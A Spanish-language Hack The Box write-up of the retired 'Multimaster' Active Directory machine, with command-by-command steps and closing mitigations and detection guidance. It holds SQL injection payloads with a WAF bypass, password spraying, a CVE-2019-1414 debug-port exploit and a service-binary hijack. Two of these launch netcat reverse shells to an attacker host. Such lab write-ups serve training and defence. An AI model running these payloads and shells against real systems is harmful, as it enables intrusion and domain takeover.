---
machine: Multimaster
os: Windows
difficulty: Insane
platform: Hack The Box
category: Windows / Active Directory / MSSQL
state: Retired
tags: [windows, active-directory, mssql, sqli, cef-debug, genericwrite, as-rep, server-operators]
---

# Multimaster — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired según HTB y writeups públicos; no comprobado con sesión en HTB.
> Ficha de método: sin flags ni credenciales reales.

## TL;DR

DC `MULTIMASTER.MEGACORP.LOCAL` del dominio `MEGACORP.LOCAL`. La API `/api/getColleagues` es vulnerable a **SQL injection**; el WAF se evade con escapes Unicode. El volcado de `Logins` da hashes Keccak-384 y contraseñas; con `SUSER_SID`/`SUSER_SNAME` se enumeran usuarios de AD y aparece `tushikikatomo`, que tiene WinRM. Desde ahí, CVE-2019-1414 en el puerto de depuración de VS Code lleva a `cyork`; una cadena de conexión en `MultimasterAPI.dll` da `sbauer`; `sbauer` tiene `GenericWrite` sobre `jorden` y se activa AS-REP; `jorden` es **Server Operators** y secuestra el binario de un servicio para llegar a SYSTEM.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 -Pn -oA nmap_all <IP>
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sCV -Pn -oA nmap_svc <IP>
```

```text
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0 (MegaCorp)
88/tcp    kerberos-sec  Microsoft Windows Kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap          AD LDAP (Domain: MEGACORP.LOCAL)
445/tcp   microsoft-ds (signing required)
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
3269/tcp  ssl/ldap
3389/tcp  ms-wbt-server
5985/tcp  wsman
9389/tcp  adws
```

- DC `MULTIMASTER`, dominio `MEGACORP.LOCAL`, Windows Server 2016.
- La web es una aplicación "MegaCorp" con una API JSON.
- MSSQL 2017 está detrás de la web; el 1433 aparece en algunos escaneos y no en otros, así que la inyección es la vía fiable, no la conexión directa.
- El share SMB requiere firma; no se usa para el foothold.

```bash
printf '%s\n' '<IP> megacorp.local multimaster.megacorp.local MULTIMASTER' | sudo tee -a /etc/hosts
```

## Enumeración

La API acepta un JSON con `name`:

```bash
curl -s -X POST http://multimaster.megacorp.local/api/getColleagues \
  -H 'Content-Type: application/json' \
  -d '{"name":"test"}'
```

El campo se concatena en SQL. El WAF bloquea comillas, espacios y `and`/`or`; los escapes Unicode (`\u0027`, `\u0020`, etc.) lo evitan. Con Burp se guarda la petición y se lanza sqlmap:

```bash
sqlmap -r colleagues.request --tamper=charunicodeescape \
  --delay 5 --level 5 --risk 3 --batch --dbms=mssql
```

La base `Hub_DB` contiene `Colleagues` y `Logins`. Los hashes de `Logins` son de 96 caracteres hexadecimales: **Keccak-384**, no SHA-384. Se identifican y se crackean con la herramienta/modo correspondiente; las contraseñas recuperadas son de baja entropía y se reutilizan.

## Foothold

### De SQLi a usuarios de AD

La misma inyección permite llamar a funciones de SQL Server que resuelven SIDs. En lugar de un diccionario, se hace **RID cycling** con `SUSER_SID` y `SUSER_SNAME`:

```sql
test' UNION ALL SELECT 58,58,58,SUSER_SID('MEGACORP\Domain Admins'),58-- -
test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- -
test' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x010500000000000515000000...),58-- -
```

El dominio tiene un SID conocido; se itera el RID y se obtienen nombres que no están en la base. Aparece `MEGACORP\tushikikatomo`, que no estaba en el volcado.

### WinRM

Se prueba la contraseña recuperada contra los usuarios enumerados:

```bash
crackmapexec smb multimaster.megacorp.local -u users.txt -p passwords.txt \
  --continue-on-success
evil-winrm -u 'MEGACORP\tushikikatomo' -p '<PASS_TUSHIKIKATOMO>' \
  -i multimaster.megacorp.local
```

La flag de usuario está en `C:\Users\alcibiades\Desktop`, aunque la cuenta sea `tushikikatomo`; el perfil no coincide con el nombre de la cuenta.

## Escalada de privilegios

### tushikikatomo → cyork: CVE-2019-1414

VS Code deja un puerto de depuración CEF accesible en localhost. `cefdebug.exe` descubre el WebSocket y ejecuta JavaScript en el contexto de Electron:

```powershell
.\cefdebug.exe
.\cefdebug.exe --url ws://127.0.0.1:<PORT>/<GUID> --code ^
  "process.mainModule.require('child_process').exec('C:/temp/nc64.exe -e cmd.exe <LHOST> 443')"
```

El proceso corre como `cyork`; se obtiene una shell en ese contexto.

### cyork → sbauer: cadena de conexión en la DLL

En `C:\inetpub\wwwroot\bin\MultimasterAPI.dll` hay una cadena de conexión:

```text
server=localhost;database=Hub_DB;uid=finder;password=<PASS_FINDER>;
```

Se extrae con `strings -el` y se prueba contra los usuarios:

```bash
strings -el MultimasterAPI.dll | grep -i 'password'
crackmapexec smb multimaster.megacorp.local -u users.txt -p '<PASS_FINDER>'
```

Coincide con `sbauer` (`<PASS_SBAUER>`).

### sbauer → jorden: GenericWrite y AS-REP

BloodHound muestra que `sbauer` tiene **GenericWrite** sobre `jorden`:

```bash
bloodhound-python -u sbauer -p '<PASS_SBAUER>' -c All \
  -d megacorp.local -dc multimaster.megacorp.local -ns <IP>
```

Con ese derecho se activa `DONT_REQ_PREAUTH` en `jorden`:

```powershell
Set-DomainObject -Identity jorden -XOR @{useraccountcontrol = 4194304} -Verbose
# alternativa: Set-ADAccountControl jorden -DoesNotRequirePreAuth $true
```

Se pide el AS-REP y se crackea:

```bash
GetNPUsers.py -no-pass -dc-ip <IP> MEGACORP/jorden -format hashcat
hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt
```

Resultado: `jorden:<PASS_JORDEN>`. Se recomienda revertir el flag UAC al terminar.

### jorden → SYSTEM: Server Operators

`jorden` es miembro de **Server Operators**, con permiso para cambiar la configuración de servicios. Se apunta el binario de un servicio a un ejecutable propio:

```powershell
sc.exe config browser binPath= "C:\ProgramData\nc64.exe -e cmd.exe <LHOST> 443"
sc.exe stop browser
sc.exe start browser
```

```text
nt authority\system
```

Alternativa documentada: `jorden` también tiene `SeBackupPrivilege`; `robocopy /b` puede copiar la flag de root desde el escritorio de Administrator sin tocar el servicio. **No hay RBCD en esta máquina**: la ruta es GenericWrite sobre un usuario, no delegación.

## Evidencia

- Petición a `/api/getColleagues` y sqlmap con `charunicodeescape`.
- Volcado de `Logins`, hashes identificados como Keccak-384 y contraseñas redactadas.
- RID cycling con `SUSER_SID`/`SUSER_SNAME` y `tushikikatomo`.
- WinRM como `tushikikatomo`.
- `cefdebug.exe` y shell como `cyork`.
- Cadena de conexión de la DLL y `sbauer`.
- BloodHound con `GenericWrite` sobre `jorden`; UAC `4194304`; AS-REP.
- `sc.exe config` y `nt authority\system`, sin hashes ni flags.

## Lecciones aprendidas

- Un WAF que bloquea comillas y espacios no bloquea la semántica SQL: los escapes Unicode reconstruyen el payload.
- Los hashes de 96 hex pueden ser Keccak-384; identificarlos evita perder tiempo con SHA-384.
- `SUSER_SID`/`SUSER_SNAME` convierten una SQLi en enumeración de AD, sin LDAP ni credenciales.
- El perfil de una cuenta (`alcibiades`) no siempre coincide con su `sAMAccountName` (`tushikikatomo`).
- `GenericWrite` sobre un usuario permite AS-REP sin tocar su contraseña; Server Operators convierte el acceso en SYSTEM.

## Mitigaciones y detección

- Parametrizar las consultas; el WAF no sustituye a las consultas preparadas. Validar el JSON y limitar la superficie de la API.
- No guardar cadenas de conexión con contraseñas en DLLs; usar autenticación integrada o un gestor de secretos.
- Revisar `GenericWrite`/`GenericAll` sobre usuarios; monitorizar cambios de UAC (4738) y AS-REP (4768).
- Restringir Server Operators y los permisos de configuración de servicios; auditar 7045 y cambios en `HKLM\SYSTEM\CurrentControlSet\Services`.
- Detección: 4662, 4738, 4768/4769, 7045, 4697 y consultas SQL anómalas.
- MITRE: T1190, T1558.004, T1098, T1543.003, T1003.

## Referencias

- <https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html>
- <https://axcheron.github.io/writeups/htb/multimaster>
- <https://chr0x6eos.github.io/2020/09/19/htb-Multimaster.html>
- <https://www.hackthebox.com/machines/multimaster>
